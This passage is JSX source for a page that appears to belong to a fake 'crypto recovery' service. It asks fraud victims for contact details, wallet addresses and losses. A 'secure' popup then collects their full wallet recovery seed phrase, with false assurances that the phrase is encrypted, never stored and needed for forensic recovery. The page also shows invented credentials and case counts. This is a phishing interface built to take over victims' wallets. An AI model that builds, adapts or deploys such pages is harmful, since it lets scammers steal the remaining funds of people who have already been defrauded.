                <Link to="/services" className="hover:text-blue-400 px-3 py-2 text-sm font-medium transition-colors duration-200" style={{color: 'var(--text-secondary)'}}>Services</Link>
                <Link to="/contact-form" className="px-3 py-2 text-sm font-medium transition-colors duration-200" style={{color: 'var(--text-accent)'}}>Report Case</Link>
                <a href="#" className="hover:text-blue-400 px-3 py-2 text-sm font-medium transition-colors duration-200" style={{color: 'var(--text-secondary)'}}>About</a>
              </div>
            </div>
            <div className="hidden md:flex items-center space-x-4">
              <a href="#" className="hover:text-blue-400 px-3 py-2 text-sm font-medium transition-colors duration-200" style={{color: 'var(--text-secondary)'}}>Log In</a>
            </div>
          </div>
        </nav>
      </header>

      {/* Initial Form */}
      {initialFormState === 'form' && (
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
          <div className="mb-8">
            <Link 
              to="/" 
              className="inline-flex items-center hover:text-blue-400 text-sm font-medium transition-colors duration-200"
              style={{color: 'var(--text-accent)'}}
            >
              <ArrowLeftIcon className="h-4 w-4 mr-2" />
              Back to Home
            </Link>
          </div>

          <div className="text-center mb-12">
            <h1 className="text-4xl font-bold mb-4" style={{color: 'var(--text-primary)'}}>
              Professional Crypto Recovery Case Submission
            </h1>
            <p className="text-xl max-w-3xl mx-auto" style={{color: 'var(--text-secondary)'}}>
              Submit your case for immediate review by our certified blockchain forensics team. 
              Secure, confidential, and legally compliant.
            </p>
          </div>

          <div className="rounded-lg shadow-lg p-8" style={{background: 'var(--bg-card)'}}>
            <form onSubmit={handleInitialSubmit}>
              {/* Contact Information */}
              <div className="mb-8">
                <h2 className="text-2xl font-semibold mb-6" style={{color: 'var(--text-primary)'}}>Contact Information</h2>
                <div className="grid md:grid-cols-2 gap-6">
                  <div>
                    <label htmlFor="name" className="block text-sm font-medium mb-2" style={{color: 'var(--text-secondary)'}}>
                      Full Name *
                    </label>
                    <input
                      type="text"
                      id="name"
                      className={`w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 ${
                        validation.name ? 'border-gray-600' : 'border-red-500'
                      }`}
                      style={{backgroundColor: 'rgba(255,255,255,0.1)', color: 'var(--text-primary)'}}
                      placeholder="Your full name"
                      value={formData.name}
                      onChange={(e) => setFormData({...formData, name: e.target.value})}
                      required
                    />
                    {!validation.name && <p className="text-sm text-red-400 mt-1">Name is required</p>}
                  </div>

                  <div>
                    <label htmlFor="email" className="block text-sm font-medium mb-2" style={{color: 'var(--text-secondary)'}}>
                      Email Address *
                    </label>
                    <input
                      type="email"
                      id="email"
                      className={`w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 ${
                        validation.email ? 'border-gray-600' : 'border-red-500'
                      }`}
                      style={{backgroundColor: 'rgba(255,255,255,0.1)', color: 'var(--text-primary)'}}
                      placeholder="your.email@example.com"
                      value={formData.email}
                      onChange={(e) => setFormData({...formData, email: e.target.value})}
                      required
                    />
                    {!validation.email && <p className="text-sm text-red-400 mt-1">Valid email required</p>}
                  </div>
                </div>

                <div className="mt-6">
                  <label htmlFor="phone" className="block text-sm font-medium mb-2" style={{color: 'var(--text-secondary)'}}>
                    Phone Number
                  </label>
                  <input
                    type="tel"
                    id="phone"
                    className="w-full px-4 py-3 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200"
                    style={{backgroundColor: 'rgba(255,255,255,0.1)', color: 'var(--text-primary)'}}
                    placeholder="+1 (555) 123-4567"
                    value={formData.phone}
                    onChange={(e) => setFormData({...formData, phone: e.target.value})}
                  />
                </div>
              </div>

              {/* Transaction Details */}
              <div className="mb-8">
                <h2 className="text-2xl font-semibold mb-6" style={{color: 'var(--text-primary)'}}>Transaction Details</h2>
                
                <div className="grid md:grid-cols-2 gap-6">
                  <div>
                    <label htmlFor="blockchain" className="block text-sm font-medium mb-2" style={{color: 'var(--text-secondary)'}}>
                      Blockchain Network *
                    </label>
                    <select
                      id="blockchain"
                      className={`w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 ${
                        validation.blockchain ? 'border-gray-600' : 'border-red-500'
                      }`}
                      style={{backgroundColor: 'rgba(255,255,255,0.1)', color: 'var(--text-primary)'}}
                      value={formData.blockchain}
                      onChange={(e) => setFormData({...formData, blockchain: e.target.value})}
                      required
                    >
                      <option value="">Select blockchain...</option>
                      {CRYPTOCURRENCIES.map((crypto) => (
                        <option key={crypto.symbol} value={crypto.symbol}>
                          {crypto.icon} {crypto.symbol} - {crypto.name}
                        </option>
                      ))}
                    </select>
                    {!validation.blockchain && <p className="text-sm text-red-400 mt-1">Please select a blockchain</p>}
                  </div>

                  <div>
                    <label htmlFor="amountStolen" className="block text-sm font-medium mb-2" style={{color: 'var(--text-secondary)'}}>
                      Amount Stolen (USD) *
                    </label>
                    <input
                      type="number"
                      id="amountStolen"
                      className={`w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 ${
                        validation.amountStolen ? 'border-gray-600' : 'border-red-500'
                      }`}
                      style={{backgroundColor: 'rgba(255,255,255,0.1)', color: 'var(--text-primary)'}}
                      placeholder="50000"
                      value={formData.amountStolen}
                      onChange={(e) => setFormData({...formData, amountStolen: e.target.value})}
                      min="0"
                      step="0.01"
                      required
                    />
                    {!validation.amountStolen && <p className="text-sm text-red-400 mt-1">Valid amount required</p>}
                  </div>
                </div>

                <div className="mt-6 grid md:grid-cols-2 gap-6">
                  <div>
                    <label htmlFor="victimAddress" className="block text-sm font-medium mb-2" style={{color: 'var(--text-secondary)'}}>
                      Victim Address *
                    </label>
                    <input
                      type="text"
                      id="victimAddress"
                      className={`w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 ${
                        validation.victimAddress ? 'border-gray-600' : 'border-red-500'
                      }`}
                      style={{backgroundColor: 'rgba(255,255,255,0.1)', color: 'var(--text-primary)'}}
                      placeholder="Your wallet address"
                      value={formData.victimAddress}
                      onChange={(e) => setFormData({...formData, victimAddress: e.target.value})}
                      required
                    />
                    {!validation.victimAddress && <p className="text-sm text-red-400 mt-1">Victim address required</p>}
                  </div>

                  <div>
                    <label htmlFor="scammerAddress" className="block text-sm font-medium mb-2" style={{color: 'var(--text-secondary)'}}>
                      Scammer Address *
                    </label>
                    <input
                      type="text"
                      id="scammerAddress"
                      className={`w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 ${
                        validation.scammerAddress ? 'border-gray-600' : 'border-red-500'
                      }`}
                      style={{backgroundColor: 'rgba(255,255,255,0.1)', color: 'var(--text-primary)'}}
                      placeholder="Scammer's wallet address"
                      value={formData.scammerAddress}
                      onChange={(e) => setFormData({...formData, scammerAddress: e.target.value})}
                      required
                    />
                    {!validation.scammerAddress && <p className="text-sm text-red-400 mt-1">Scammer address required</p>}
                  </div>
                </div>

                <div className="mt-6">
                  <label htmlFor="transactionHash" className="block text-sm font-medium mb-2" style={{color: 'var(--text-secondary)'}}>
                    Transaction Hash *
                  </label>
                  <input
                    type="text"
                    id="transactionHash"
                    className={`w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 ${
                      validation.transactionHash ? 'border-gray-600' : 'border-red-500'
                    }`}
                    style={{backgroundColor: 'rgba(255,255,255,0.1)', color: 'var(--text-primary)'}}
                    placeholder="Transaction ID / Hash"
                    value={formData.transactionHash}
                    onChange={(e) => setFormData({...formData, transactionHash: e.target.value})}
                    required
                  />
                  {!validation.transactionHash && <p className="text-sm text-red-400 mt-1">Transaction hash required (min 10 characters)</p>}
                </div>
              </div>

              {/* Case Summary */}
              <div className="mb-8">
                <h2 className="text-2xl font-semibold mb-6" style={{color: 'var(--text-primary)'}}>Case Summary</h2>
                <div>
                  <label htmlFor="details" className="block text-sm font-medium mb-2" style={{color: 'var(--text-secondary)'}}>
                    Detailed Case Description *
                  </label>
                  <textarea
                    id="details"
                    rows={6}
                    className={`w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 resize-none ${
                      validation.details ? 'border-gray-600' : 'border-red-500'
                    }`}
                    style={{backgroundColor: 'rgba(255,255,255,0.1)', color: 'var(--text-primary)'}}
                    placeholder="Describe how the incident occurred, when it happened, what you were doing when you noticed, and any other relevant details..."
                    value={formData.details}
                    onChange={(e) => setFormData({...formData, details: e.target.value})}
                    minLength={50}
                    required
                  />
                  <p className="text-sm mt-1" style={{color: 'var(--text-muted)'}}>
                    Please provide at least 50 characters describing your case.
                  </p>
                  {!validation.details && <p className="text-sm text-red-400 mt-1">Minimum 50 characters required</p>}
                </div>
              </div>

              {/* Security Notice */}
              <div className="mb-8 border border-blue-500/30 rounded-lg p-6 backdrop-blur-sm" style={{background: 'linear-gradient(135deg, rgba(59, 130, 246, 0.1) 0%, rgba(79, 70, 229, 0.1) 100%)'}}>
                <div className="flex items-start">
                  <ShieldCheckIcon className="h-6 w-6 mt-0.5 mr-3 flex-shrink-0" style={{color: 'var(--text-accent)'}} />
                  <div>
                    <h3 className="text-lg font-semibold mb-2" style={{color: 'var(--text-primary)'}}>Professional Security Protocol</h3>
                    <ul className="space-y-2" style={{color: 'var(--text-secondary)'}}>
                      <li>• Initial case submission is completely anonymous</li>
                      <li>• Recovery phrase collected in next step via secure popup</li>
                      <li>• All data encrypted end-to-end</li>
                      <li>• Certified blockchain forensics team review</li>
                    </ul>
                  </div>
                </div>
              </div>

              <button
                type="submit"
                className="w-full text-white py-4 px-6 rounded-lg font-semibold text-lg transition-all duration-300 hover:scale-105 hover:shadow-lg"
                style={{background: 'var(--bg-accent)', boxShadow: 'var(--shadow-button)'}}
              >
                Continue to Secure Recovery Details
              </button>
            </form>
          </div>
        </div>
      )}

      {/* Loading State */}
      {initialFormState === 'completed' && (
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
          <div className="rounded-lg p-12 shadow-lg text-center" style={{background: 'var(--bg-secondary)'}}>
            <div className="loader mb-8">
              <div className="spinner"></div>
            </div>
            <h3 className="text-white text-2xl font-semibold mb-4">Preparing Secure Recovery Window...</h3>
            <p className="text-lg leading-relaxed" style={{color: 'var(--text-secondary)'}}>
              Initial case details received. Opening secure recovery phrase collection window.
            </p>
          </div>
        </div>
      )}

      {/* Seed Phrase Popup */}
      {showSeedPhrasePopup && seedPhraseState === 'popup' && (
        <div 
          className="fixed inset-0 z-50 flex items-center justify-center p-4"
          style={{
            background: 'rgba(11, 20, 38, 0.95)',
            backdropFilter: 'blur(10px)',
            animation: 'fadeIn 0.3s ease-out'
          }}
        >
          <div 
            className="relative w-full max-w-2xl"
            style={{
              animation: 'modalSlideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1)'
            }}
          >
            {/* Modal Header */}
            <div 
              className="rounded-t-2xl p-6 border-b"
              style={{
                background: 'linear-gradient(135deg, rgba(34, 197, 94, 0.1) 0%, rgba(59, 130, 246, 0.1) 100%)',
                borderColor: 'rgba(34, 197, 94, 0.2)'
              }}
            >
              <div className="text-center">
                <div className="w-16 h-16 mx-auto mb-4 rounded-full flex items-center justify-center" style={{background: 'linear-gradient(135deg, #10b981 0%, #3b82f6 100%)'}}>
                  <ShieldCheckIcon className="w-8 h-8 text-white" />
                </div>
                <h2 className="text-2xl font-bold text-white mb-2">Secure Recovery Phrase Collection</h2>
                <p className="text-sm" style={{color: 'var(--text-secondary)'}}>
                  Case <code className="text-green-400 font-mono bg-gray-800 px-2 py-1 rounded">{caseId || 'Pending'}</code> ready for final step
                </p>
              </div>
            </div>

            {/* Modal Body */}
            <div 
              className="p-6"
              style={{
                background: 'linear-gradient(145deg, #1e2a3a 0%, #2a3441 100%)',
                borderRadius: '0 0 1rem 1rem'
              }}
            >
              <div className="mb-6">
                <h3 className="text-lg font-semibold mb-3" style={{color: 'var(--text-primary)'}}>
                  🔐 Recovery Seed Phrase
                </h3>
                <p className="text-sm mb-4" style={{color: 'var(--text-secondary)'}}>
                  For blockchain analysis and fund recovery proceedings, we need your wallet's recovery phrase. 
                  This information is encrypted and never stored on our servers.
                </p>
              </div>

              <div className="mb-6">
                <label htmlFor="seedPhrase" className="block text-sm font-medium mb-2" style={{color: 'var(--text-secondary)'}}>
                  12 or 24-Word Recovery Phrase *
                </label>
                <textarea
                  id="seedPhrase"
                  rows={4}
                  className={`w-full px-4 py-3 rounded-lg focus:outline-none focus:ring-2 transition-all duration-200 resize-none ${
                    phraseValidation.touched 
                      ? phraseValidation.valid 
                        ? 'border-2 border-green-500 focus:ring-green-500' 
                        : 'border-2 border-red-500 focus:ring-red-500'
                      : 'border border-gray-600 focus:ring-blue-500 focus:border-transparent'
                  }`}
                  style={{
                    backgroundColor: 'rgba(255,255,255,0.1)', 
                    color: 'var(--text-primary)'
                  }}
                  placeholder="Enter your recovery phrase (e.g., abandon ability able about above...)"
                  value={seedPhraseData.phrase}
                  onChange={(e) => {
                    setSeedPhraseData({phrase: e.target.value})
                    setPhraseValidation({...phraseValidation, touched: true})
                  }}
                  onBlur={() => setPhraseValidation({...phraseValidation, touched: true})}
                />
                
                {/* Error Message */}
                {phraseValidation.touched && phraseValidation.error && (
                  <p className="text-sm text-red-400 mt-2 font-medium">
                    {phraseValidation.error}
                  </p>
                )}
                
                {/* Valid Message */}
                {phraseValidation.touched && phraseValidation.valid && (
                  <p className="text-sm text-green-400 mt-2 font-medium">
                    ✓ Valid BIP-39 seed phrase detected
                  </p>
                )}
                
                {/* Help Text */}
                <p className="text-sm mt-2" style={{color: 'var(--text-muted)'}}>
                  Must be exactly 12 or 24 words from the BIP-39 word list
                </p>
              </div>

              {/* Security Notice */}
              <div className="mb-6 border border-yellow-500/30 rounded-lg p-4" style={{background: 'rgba(234, 179, 8, 0.1)'}}>
                <div className="flex items-start">
                  <ShieldCheckIcon className="h-5 w-5 mt-0.5 mr-2 flex-shrink-0 text-yellow-400" />
                  <div>
                    <p className="text-sm font-medium text-yellow-400 mb-1">Security Protocol</p>
                    <p className="text-xs" style={{color: 'var(--text-secondary)'}}>
                      Your recovery phrase is encrypted during transmission and never stored on our servers. 
                      Only used for blockchain analysis and recovery proceedings.
                    </p>
                  </div>
                </div>
              </div>

              {/* Action Buttons */}
              <div className="flex gap-4">
                <button
                  onClick={handleAbandonRecovery}
                  className="flex-1 px-4 py-3 rounded-lg font-medium border transition-all duration-200"
                  style={{color: 'var(--text-secondary)', borderColor: 'rgba(255,255,255,0.2)'}}
                >
                  Abandon Recovery
                </button>
                <button
                  onClick={handleSeedPhraseSubmit}
                  disabled={!phraseValidation.valid}
                  className={`flex-1 px-4 py-3 rounded-lg font-semibold transition-all duration-200 ${
                    phraseValidation.valid
                      ? 'text-white hover:scale-105'
                      : 'opacity-50 cursor-not-allowed'
                  }`}
                  style={{background: phraseValidation.valid ? 'var(--bg-accent)' : 'var(--bg-secondary)'}}
                >
                  Submit Complete Case
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Loading State for Seed Phrase */}
      {seedPhraseState === 'loading' && (
        <div 
          className="fixed inset-0 z-50 flex items-center justify-center p-4"
          style={{
            background: 'rgba(11, 20, 38, 0.95)',
            backdropFilter: 'blur(10px)'
          }}
        >
          <div className="text-center">
            <div className="loader mb-8">
              <div className="spinner"></div>
            </div>
            <h3 className="text-white text-2xl font-semibold mb-4">Securing Your Recovery Case...</h3>
            <p className="text-lg leading-relaxed" style={{color: 'var(--text-secondary)'}}>
              Your complete case is being encrypted and transmitted to our forensic team.
            </p>
          </div>
        </div>
      )}

      {/* Success State */}
      {seedPhraseState === 'success' && (
        <div 
          className="fixed inset-0 z-50 flex items-center justify-center p-4"
          style={{
            background: 'rgba(11, 20, 38, 0.95)',
            backdropFilter: 'blur(10px)'
          }}
        >
          <div 
            className="relative w-full max-w-lg"
            style={{
              animation: 'modalSlideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1)'
            }}
          >
            <div 
              className="rounded-2xl overflow-hidden"
              style={{
                background: 'linear-gradient(145deg, rgba(17, 29, 54, 0.98) 0%, rgba(24, 36, 63, 0.98) 100%)',
                boxShadow: '0 20px 60px rgba(0, 0, 0, 0.5), 0 0 1px rgba(34, 197, 94, 0.3)',
                border: '1px solid rgba(34, 197, 94, 0.15)'
              }}
            >
              {/* Success Header */}
              <div 
                className="px-6 py-5 border-b"
                style={{
                  background: 'linear-gradient(135deg, rgba(16, 185, 129, 0.08) 0%, rgba(34, 197, 94, 0.12) 100%)',
                  borderColor: 'rgba(34, 197, 94, 0.2)'
                }}
              >
                <div className="flex items-center gap-3">
                  <div className="w-12 h-12 rounded-full flex items-center justify-center" style={{background: 'linear-gradient(135deg, rgba(34, 197, 94, 0.2) 0%, rgba(16, 185, 129, 0.15) 100%)'}}>
                    <CheckCircleIcon className="w-6 h-6 text-green-400" />
                  </div>
                  <div>
                    <h2 className="text-xl font-bold text-green-400">Recovery Case Submitted</h2>
                    <p className="text-sm text-gray-400">
                      Reference: <code className="text-green-400 font-mono font-semibold">{caseId}</code>
                    </p>
                  </div>
                </div>
              </div>

              {/* Success Body */}
              <div className="px-6 py-5 space-y-4">
                <div className="p-4 rounded-xl" style={{background: 'rgba(34, 197, 94, 0.06)', border: '1px solid rgba(34, 197, 94, 0.15)'}}>
                  <p className="text-sm leading-relaxed" style={{color: 'var(--text-secondary)'}}>
                    Your complete case has been received by our <span className="text-green-400 font-medium">certified forensic investigation team</span> for immediate analysis.
                  </p>
                </div>

                <div className="p-3 rounded-lg" style={{background: 'rgba(59, 130, 246, 0.05)', border: '1px solid rgba(59, 130, 246, 0.1)'}}>
                  <p className="text-sm font-medium text-blue-300 mb-1">Expected Response Time</p>
                  <p className="text-xs text-gray-400">
                    Direct contact from our specialists within <strong className="text-blue-400">60 minutes</strong> with detailed findings and recovery options.
                  </p>
                </div>
              </div>

              {/* Success Footer */}
              <div className="px-6 py-4 border-t" style={{background: 'rgba(0, 0, 0, 0.2)', borderColor: 'rgba(255, 255, 255, 0.05)'}}>
                <Link 
                  to="/" 
                  className="block w-full text-center py-3 rounded-lg font-semibold text-sm transition-all duration-300 hover:scale-[1.02] group text-white"
                  style={{background: 'linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%)'}}
                >
                  Return to Home
                </Link>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Error State */}
      {seedPhraseState === 'error' && (
        <div 
          className="fixed inset-0 z-50 flex items-center justify-center p-4"
          style={{
            background: 'rgba(11, 20, 38, 0.95)',
            backdropFilter: 'blur(10px)'
          }}
        >
          <div className="rounded-lg p-12 shadow-2xl text-center max-w-2xl w-full border border-red-500/30" style={{background: 'var(--bg-secondary)'}}>
            <div className="mb-8">
              <svg className="w-24 h-24 mx-auto text-red-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
              </svg>
            </div>
            
            <h3 className="text-3xl font-bold text-red-400 mb-6">Submission Error</h3>
            <p className="text-lg mb-8" style={{color: 'var(--text-secondary)'}}>
              We encountered an error processing your submission. Your case data has been preserved.
            </p>
            
            <div>
              <button 
                onClick={() => setSeedPhraseState('popup')}
                className="text-white px-8 py-4 rounded-lg font-semibold text-lg transition-all duration-300 hover:scale-105 hover:shadow-xl"
                style={{background: 'linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%)'}}
              >
                Try Again
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Footer */}
      {initialFormState === 'form' && (
        <footer className="text-white py-16 mt-20" style={{background: 'var(--bg-secondary)'}}>
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="text-center mb-8">
              <Logo variant="footer" />
              <p className="mb-6" style={{color: 'var(--text-secondary)'}}>
                The world's most trusted crypto recovery service
              </p>
              <div className="flex justify-center space-x-6">
                <Link to="/" className="hover:text-white transition-colors duration-200" style={{color: 'var(--text-secondary)'}}>Home</Link>
                <Link to="/services" className="hover:text-white transition-colors duration-200" style={{color: 'var(--text-secondary)'}}>Services</Link>
                <Link to="/contact-form" className="hover:text-white transition-colors duration-200" style={{color: 'var(--text-secondary)'}}>Report Case</Link>
                <a href="#" className="hover:text-white transition-colors duration-200" style={{color: 'var(--text-secondary)'}}>About</a>
              </div>
            </div>
            <div className="pt-8" style={{borderColor: 'var(--text-muted)'}}>
              <div className="flex flex-col md:flex-row justify-between items-center">
                <div className="mb-4 md:mb-0" style={{color: 'var(--text-secondary)'}}>
                  24/7 Support Available
                </div>
                <div className="font-semibold" style={{color: 'var(--text-secondary)'}}>
                  5000+ investigations completed
                </div>
              </div>
            </div>
          </div>
        </footer>
      )}

      <style>{`
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes modalSlideUp {
          from {
            opacity: 0;
            transform: translateY(20px) scale(0.95);
          }
          to {
            opacity: 1;
            transform: translateY(0) scale(1);
          }
        }
      `}</style>
    </div>
  )
}